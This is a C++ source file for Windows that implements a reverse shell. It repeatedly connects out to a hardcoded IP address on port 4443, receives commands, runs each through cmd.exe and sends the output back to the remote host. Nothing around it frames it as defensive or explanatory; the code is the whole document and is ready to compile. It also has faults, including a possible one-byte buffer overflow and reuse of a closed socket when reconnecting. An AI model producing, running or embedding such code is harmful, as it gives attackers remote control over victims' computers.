#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

const char* SERVER_IP = "192.168.88.98";
const int SERVER_PORT = 4443;

void executeCommand(SOCKET clientSocket, const std::string& command) {
    char buffer[4096];
    std::string cmd = "cmd.exe /c " + command;

    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        send(clientSocket, "Failed to execute command.\n", 27, 0);
        return;
    }

    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        send(clientSocket, buffer, strlen(buffer), 0);
    }

    _pclose(pipe);
}

int main() {
    WSADATA wsaData;
    SOCKET clientSocket;
    sockaddr_in serverAddr;
    char recvbuf[512];
    int recvbuflen = 512;
    int result;

    // Initialize Winsock
    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return 1;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(SERVER_PORT);

    while (true) {
        result = connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
        if (result == SOCKET_ERROR) {
            std::cerr << "Unable to connect to server: " << WSAGetLastError() << std::endl;
            closesocket(clientSocket);
            Sleep(2000); 
            continue;
        }

        std::cout << "Connected to server." << std::endl;

        while (true) {
            send(clientSocket, ">", 1, 0);
            result = recv(clientSocket, recvbuf, recvbuflen, 0);
            if (result > 0) {
                recvbuf[result] = '\0';
                std::string command(recvbuf);

                if (command == "exit\n" || command == "exit\r\n") {
                    send(clientSocket, "Connection closed.\n", 19, 0);
                    closesocket(clientSocket);
                    WSACleanup();
                    return 0;
                }

                executeCommand(clientSocket, command);
            } else if (result == 0) {
                std::cout << "Connection closed." << std::endl;
                break;
            } else {
                std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
                break;
            }
        }

        closesocket(clientSocket);
    }

    WSACleanup();
    return 0;
}
